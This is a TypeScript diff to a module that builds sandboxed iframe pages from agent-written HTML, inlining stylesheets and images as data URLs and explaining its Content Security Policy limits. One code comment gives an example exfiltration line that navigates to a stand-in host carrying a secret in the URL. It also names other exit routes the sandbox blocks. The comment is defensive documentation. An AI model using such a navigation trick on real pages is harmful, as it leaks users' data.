@@ -28,9 +28,19 @@ export type WuiLoad = (relPath: string) => Promise<WuiAsset | null>;
 /**
  * The page's ceiling. `default-src 'none'` is the load-bearing clause: with no
  * `connect-src` of its own it also governs fetch / XHR / WebSocket, so a page
- * cannot send what it read anywhere. That matters more than it looks — the
- * iframe's origin is `null`, and CORS would still let the REQUEST leave (it only
- * withholds the response), so "can't read the answer" is not "can't exfiltrate".
+ * cannot send what it read through a request. That matters more than it looks —
+ * the iframe's origin is `null`, and CORS would still let the REQUEST leave (it
+ * only withholds the response), so "can't read the answer" is not "can't
+ * exfiltrate".
+ *
+ * **This is not the whole of it, and cannot be.** CSP has no directive a
+ * document can use to stop ITSELF navigating — `navigate-to` was dropped from
+ * CSP3 and never shipped — so `location.href = "https://x/?d=" + secret` walked
+ * straight past everything here until `SPA_CSP`'s `frame-src` (`api/spa.py`)
+ * closed it from the CONTAINING document, which is the only actor that can.
+ * Measured: with that header absent, every other route out (fetch, beacon,
+ * WebSocket, image, popup, nested frame, form) was refused and self-navigation
+ * was not.
  *
  * Inline script and style are allowed because the whole page is one inlined
  * document: forbidding them would leave nothing able to run. What is taken away
@@ -75,6 +85,48 @@ function safeScriptText(code: string): string {
   return code.replace(/<\/script/gi, "<\\/script");
 }
 
+/** Where a picture can be spelled in markup. `srcset` is deliberately absent —
+ * it is a list with descriptors rather than one reference, and an agent writing
+ * one gets a page that renders from `src` instead of a broken rewrite. */
+const MEDIA_REFS: ReadonlyArray<readonly [string, string]> = [
+  ["img[src], source[src], video[src], audio[src], embed[src]", "src"],
+  ["video[poster]", "poster"],
+  ["image[href]", "href"],
+];
+
+/** An asset as something a `src`/`url()` can point at with no network. A text
+ * asset reaching here is a picture that happens to be text — an SVG — so it is
+ * base64'd under its own media type rather than left as a file reference. */
+function dataUrlFor(rel: string, asset: WuiAsset): string {
+  if (asset.kind === "binary") return asset.dataUrl;
+  const type = /\.svg$/i.test(rel) ? "image/svg+xml" : "text/plain";
+  // The standard way to get a latin1 string `btoa` accepts out of UTF-8 text.
+  const latin1 = String.fromCharCode(...new TextEncoder().encode(asset.text));
+  return `data:${type};base64,${btoa(latin1)}`;
+}
+
+/**
+ * Resolve `url(...)` references inside a stylesheet.
+ *
+ * A background image is the one asset that never appears in the markup, so
+ * nothing else here would ever see it — and with no network an unresolved one
+ * is simply invisible, which is the hardest kind of missing to notice.
+ */
+async function inlineCssUrls(
+  css: string,
+  take: (rel: string) => Promise<WuiAsset | null>,
+): Promise<string> {
+  let out = css;
+  for (const [match, , raw] of [...css.matchAll(/url\(\s*(['"]?)([^'")]+)\1\s*\)/g)]) {
+    const rel = folderRelative(raw.trim());
+    if (!rel) continue;
+    const asset = await take(rel);
+    if (!asset) continue;
+    out = out.split(match).join(`url(${dataUrlFor(rel, asset)})`);
+  }
+  return out;
+}
+
 /** The assembled document plus the folder files it consumed. */
 export type WuiDoc = {
   /** Ready for an iframe's `srcDoc`. */
@@ -117,16 +169,25 @@ export async function assembleWuiDoc(entryHtml: string, load: WuiLoad): Promise<
     const asset = await take(rel);
     if (asset?.kind !== "text") continue;
     const style = doc.createElement("style");
-    style.textContent = asset.text;
+    style.textContent = await inlineCssUrls(asset.text, take);
     el.replaceWith(style);
   }
 
-  for (const el of Array.from(doc.querySelectorAll("img[src], source[src], video[src], audio[src]"))) {
-    const rel = folderRelative(el.getAttribute("src"));
-    if (!rel) continue;
-    const asset = await take(rel);
-    if (asset?.kind !== "binary") continue;
-    el.setAttribute("src", asset.dataUrl);
+  // A stylesheet the page wrote itself gets the same treatment as one it
+  // linked: `url()` is where an agent puts a background, and neither spelling
+  // can reach the network.
+  for (const el of Array.from(doc.querySelectorAll("style"))) {
+    el.textContent = await inlineCssUrls(el.textContent ?? "", take);
+  }
+
+  for (const [selector, attr] of MEDIA_REFS) {
+    for (const el of Array.from(doc.querySelectorAll(selector))) {
+      const rel = folderRelative(el.getAttribute(attr));
+      if (!rel) continue;
+      const asset = await take(rel);
+      if (!asset) continue;
+      el.setAttribute(attr, dataUrlFor(rel, asset));
+    }
   }
 
   // Our runtime goes second — after the CSP, which nothing may precede, and
